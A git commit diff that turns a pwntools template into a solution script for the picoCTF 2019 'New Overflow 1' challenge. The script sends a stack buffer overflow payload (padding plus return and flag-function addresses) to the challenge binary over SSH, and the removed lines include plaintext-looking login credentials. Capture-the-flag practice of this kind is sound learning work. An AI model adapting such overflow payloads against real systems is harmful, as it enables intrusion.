298bfa9a62b0d0bd5428c0a1f348b1672cd1b207
Amit Nizri <amitnzri@gmail.com>
2020-03-15 21:56:43 +0200

    New Over Flow 1

--- pico2019/new_overflow_1/payload.py
+++ pico2019/new_overflow_1/payload.py
@@ -1,77 +1,27 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template --host 2019shell1.picoctf.com --user amitniz --pass 2684 --path /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln
+import sys
 from pwn import *
 
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF('vuln')
+args = sys.argv
 
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-# ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or '2019shell1.picoctf.com'
-port = int(args.PORT or 22)
-user = args.USER or 'amitniz'
-password = args.PASSWORD or '2684'
-remote_path = '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln'
+user = None
+pw = None
 
-# Connect to the remote SSH server
-shell = None
-if not args.LOCAL:
-    shell = ssh(user, host, port, password)
-    shell.set_working_directory(symlink=True)
+flag_addr = 0x00400767
+jmp_addr = 0x00400850
 
-def local(argv=[], *a, **kw):
-    '''Execute the target binary locally'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
+payload = 'a'*72 + p64(jmp_addr)+p64(flag_addr)
 
-def remote(argv=[], *a, **kw):
-    '''Execute the target binary on the remote host'''
-    if args.GDB:
-        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
-    else:
-        return shell.process([remote_path] + argv, *a, **kw)
+try:
+    user = args[1].strip('user=')
+    pw = args[2].strip('pass=')
+except:
+    print("[!] No username and password was found")
+    exit(1)
 
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.LOCAL:
-        return local(argv, *a, **kw)
-    else:
-        return remote(argv, *a, **kw)
+s = ssh(host='2019shell1.picoctf.com',user=user,password=pw)
+sh = s.process('vuln', cwd = '/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = '''
-tbreak main
-continue
-'''.format(**locals())
-
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    No canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
-
-io = start()
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-
-io.interactive()
+sh.sendlineafter(': ',payload)
+sh.sendlineafter(': ', 'a')
+sh.interactive()
 
